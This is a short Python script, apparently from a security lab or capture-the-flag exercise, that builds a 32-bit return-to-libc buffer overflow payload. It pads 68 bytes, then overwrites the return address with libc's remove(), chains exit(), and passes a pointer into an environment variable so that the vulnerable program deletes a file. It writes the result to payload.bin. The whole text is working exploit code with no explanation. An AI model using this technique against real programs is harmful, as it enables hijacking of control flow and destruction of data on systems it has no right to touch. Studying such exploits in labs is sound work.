import struct

# Addresses (these may need to be adjusted based on your system)
remove_addr = 0xf7e71f30  # Address of remove() function
exit_addr = 0xf7e449e0    # Address of exit() function
dummy_addr = 0xffffd93a   # Address of DUMMY environment variable

# Construct the payload
payload = b'A' * 68  # 64 bytes for buf + 4 bytes for saved EBP
payload += struct.pack('<I', remove_addr)  # Overwrite return address with remove()
payload += struct.pack('<I', exit_addr)    # Address to return to after remove()
payload += struct.pack('<I', dummy_addr + 6)   # Argument for remove(), adjusted by 6


# Write payload to file
with open('payload.bin', 'wb') as f:
    f.write(payload)

print("Payload written to payload.bin: {}".format(payload))